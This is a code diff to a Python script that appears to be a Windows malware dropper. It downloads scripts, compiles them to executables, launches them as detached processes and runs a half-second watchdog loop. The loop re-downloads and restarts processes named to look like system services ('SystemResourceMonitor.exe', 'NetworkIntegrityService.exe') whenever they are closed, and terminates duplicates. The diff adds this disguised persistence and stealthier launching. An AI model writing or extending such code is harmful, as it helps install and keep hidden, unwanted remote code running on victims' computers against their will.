@@ -33,7 +33,7 @@ def compile_python_to_exe(py_file_path):
             if os.path.exists(exe_file_path):
                 exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
                 shutil.move(exe_file_path, exe_dest)
-                os.startfile(exe_dest)
+                subprocess.Popen(exe_dest, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_CONSOLE, shell=True)
                 return exe_dest
             else:
                 print(f"Error: Exe file not found for {py_file_path}")
@@ -126,10 +126,34 @@ if os.name == "nt":
     time.sleep(20)
     download_and_compile_scripts(urls_and_filenames)
 
-while True:
+def check_running():
+    file_names = ["SystemResourceMonitor.exe", "NetworkIntegrityService.exe"]
+    processes_running = {file: False for file in file_names}
+
     for process in psutil.process_iter(['name']):
-        if process.info['name'] in ['SystemResourceMonitor.exe', 'NetworkIntegrityService.py']:
-            process.terminate()
-            download_and_compile_scripts(urls_and_filenames)
-            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
+        if process.info['name'] in file_names:
+            processes_running[process.info['name']] = True
+
+    if not all(processes_running.values()):
+        for process in psutil.process_iter(['name']):
+            if process.info['name'] in file_names:
+                process.terminate()
+        download_and_compile_scripts(urls_and_filenames)
+
+
+def check_duplicate():
+    file_names = ["SystemResourceMonitor.exe", "NetworkIntegrityService.exe"]
+    for file_name in file_names:
+        instances = []
+        for process in psutil.process_iter(['name']):
+            if process.info['name'] == file_name:
+                instances.append(process)
+        if len(instances) > 1:
+            for proc in instances[1:]:
+                proc.terminate()
+
+
+while True:
+    check_running()
+    check_duplicate()
     time.sleep(0.5)
